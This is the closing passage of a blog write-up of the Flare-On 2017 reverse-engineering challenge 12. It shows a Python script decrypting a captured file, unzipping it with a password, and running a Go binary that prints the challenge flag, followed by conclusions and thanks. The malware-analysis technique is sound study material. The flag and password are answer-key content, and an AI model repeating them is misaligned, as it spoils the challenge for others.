</span><span>    sha = data[i:i+</span><span style=color:#d08770>0x20</span><span>]
</span><span>    </span><span style=color:#96b5b4>print</span><span>("</span><span style=color:#a3be8c>[+] sha: </span><span style=color:#d08770>%s</span><span>" % sha.</span><span style=color:#bf616a>encode</span><span>('</span><span style=color:#a3be8c>hex</span><span>'))
</span><span>    i += </span><span style=color:#d08770>0x20
</span><span>    enc = data[i:]
</span><span>    dec = </span><span style=color:#bf616a>decrypt</span><span>(enc, key, iv)
</span><span>    sz = </span><span style=color:#bf616a>u32</span><span>(dec[:</span><span style=color:#d08770>4</span><span>])
</span><span>    filename = dec[</span><span style=color:#d08770>4</span><span>:</span><span style=color:#d08770>4</span><span>+sz]
</span><span>    filesize = </span><span style=color:#bf616a>u32</span><span>(dec[</span><span style=color:#d08770>4</span><span>+sz:</span><span style=color:#d08770>4</span><span>+sz+</span><span style=color:#d08770>4</span><span>])
</span><span>    </span><span style=color:#96b5b4>print</span><span>("</span><span style=color:#a3be8c>[+] filepath '</span><span style=color:#d08770>%s</span><span style=color:#a3be8c>'</span><span>" % filename)
</span><span>    </span><span style=color:#96b5b4>print</span><span>("</span><span style=color:#a3be8c>[+] filesize 0x</span><span style=color:#d08770>%x</span><span>" % filesize)
</span><span>    i = </span><span style=color:#d08770>4</span><span>+sz+</span><span style=color:#d08770>8
</span><span>    decrypted_file_content = dec[i:i+filesize]
</span><span>    </span><span style=color:#96b5b4>print</span><span>("</span><span style=color:#a3be8c>[+] len(decrypted) 0x</span><span style=color:#d08770>%x</span><span style=color:#a3be8c>, writing 'lab10.zip'...</span><span>" % </span><span style=color:#96b5b4>len</span><span>(decrypted_file_content))
</span><span>    </span><span style=color:#96b5b4>open</span><span>("</span><span style=color:#a3be8c>lab10.zip</span><span>", "</span><span style=color:#a3be8c>wb</span><span>").</span><span style=color:#bf616a>write</span><span>(decrypted_file_content)
</span></code></pre><pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>$</span><span> python uf.py crypfile
</span><span style=color:#bf616a>[+]</span><span> data_size = 0x89334
</span><span style=color:#bf616a>[+]</span><span> iv: fec85f816b82806996fc991b5731d2e1
</span><span style=color:#bf616a>[+]</span><span> sha: 797c33964e0ed15a727d4175c2bff5a637da6587229cce9bd12d6a13cf8596db
</span><span style=color:#bf616a>[+]</span><span> filepath '</span><span style=color:#a3be8c>c:\work\flareon2017\package\lab10.zip</span><span>'
</span><span style=color:#bf616a>[+]</span><span> filesize 0x892c6
</span><span style=color:#bf616a>[+]</span><span> len(decrypted) </span><span style=color:#bf616a>0x892c6,</span><span> , writing '</span><span style=color:#a3be8c>lab10.zip</span><span>'...
</span></code></pre><p>We’ve got the real challenge! And to conclude, unzip <code>lab10.zip</code> with the password from the screenshot: <code>infectedinfectedinfectedinfectedinfected919</code>. This will drop a file in <code>GoChallenge/build/challenge10</code>, which is a Go challenge in ELF. But when we execute it, we see a well deserve reward:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>root@kali2:/ctf/flareon_2017/12 </span><span style=color:#65737e># ./GoChallenge/build/challenge10
</span><span style=color:#bf616a>hello</span><span> world
</span><span style=color:#bf616a>The</span><span> answer is: '</span><span style=color:#a3be8c>n3v3r_gunna_l3t_you_down_1987_4_ever@flare-on.com</span><span>'
</span></code></pre><h1 id=conclusion>Conclusion</h1><p>Thank you to FireEye for those fun challenges… and congratulations to all the winners (especially those who managed to finish in under a week, massive props)!! I hope those writeups don’t make those challenges look trivial, they weren’t (only ~130 over more than <a rel="noopener nofollow noreferrer" href=https://twitter.com/mikesiko/status/904388540267610112 target=_blank>a thousand participants</a> completed the 12 challenges). IMHO, some challenges (like the end of challenge 4 or 10) involved too much guessing, which can be very (VERY) frustrating.<p>But all in all, it was a fun experience… And thank you for whomever prepared challenge 12, it was <strong>huge</strong> in all the possible meanings, and it must certainly have required a serious patience to build!<p>And final thanks to <i class="fa fa-twitter"> alex_k_polyakov</i>, <i class="fa fa-twitter"> n4x0r31</i> and <a class="fab fa-twitter" href=https://twitter.com/aymansagy target=_blank> <code>@aymansagy</code> </a> .<p>See you next year for Flare-On 5!<aside class=post-tags><p>Categories: <a href=https://blahcat.github.io/categories/ctf/>#ctf</a><p>Tags: <a href=https://blahcat.github.io/tags/reverse/>#reverse</a> <a href=https://blahcat.github.io/tags/flareon/>#flareon</a> <a href=https://blahcat.github.io/tags/windows/>#windows</a> <a href=https://blahcat.github.io/tags/pe/>#pe</a> <a href=https://blahcat.github.io/tags/linux/>#linux</a> <a href=https://blahcat.github.io/tags/elf/>#elf</a> <a href=https://blahcat.github.io/tags/arduino-avr/>#arduino,avr</a></aside><aside class=post-discussion>Join the Discussion on <a href="https://github.com/blahcat/blahcat.github.io/discussions?discussions_q=FlareOn 4 WriteUps" target=_blank> <i class="fab fa-github fa-lg"></i> GitHub </a></aside><aside class=post-nav><div class=container><div class=row><div class=col><b>Next:</b><br><a class=post-nav-prev href=https://blahcat.github.io/2018-01-07-building-a-debian-stretch-qemu-image-for-aarch64/> <section class=post-nav-teaser><b class=post-nav-title>Building a Debian Stretch QEMU image for AARCH64</b><p class=post-nav-excerpt>Introduction After releasing my QEMU images and then publishing a post on h…</section> </a></div><div class=col><b>Previous:</b><br><a class=post-nav-next href=https://blahcat.github.io/2017-08-31-arbitrary-write-primitive-in-windows-kernel-hevd/> <section class=post-nav-teaser><b class=post-nav-title>Arbitrary Write primitive in Windows kernel (HEVD)</b><p class=post-nav-excerpt>Back again to modern Windows kernel exploitation! After understanding how t…</section> </a></div></div></div></aside></div></div><hr><footer><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><ul class="list-inline text-center"><li class=list-inline-item><a href=https://blahcat.github.io/atom.xml> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fas fa-rss fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://twitter.com/ctf_blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-twitter fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://github.com/blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-github fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://www.youtube.com/channel/UCDrgY65mRZWVoMiB5-VMqfg> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-youtube fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://discord.gg/hSbqxxBgRX> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-discord fa-stack-1x fa-inverse"></i> </span> </a></ul><p class="copyright text-muted">Made with ❤ with Zola</div></div></div></footer><script src=https://blahcat.github.io/js/jquery.min.js></script><script src=https://blahcat.github.io/js/bootstrap.bundle.min.js></script><script src=https://blahcat.github.io/js/clean-blog.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.1/mermaid.min.js></script><div class=mermaidTooltip style=opacity:0></div>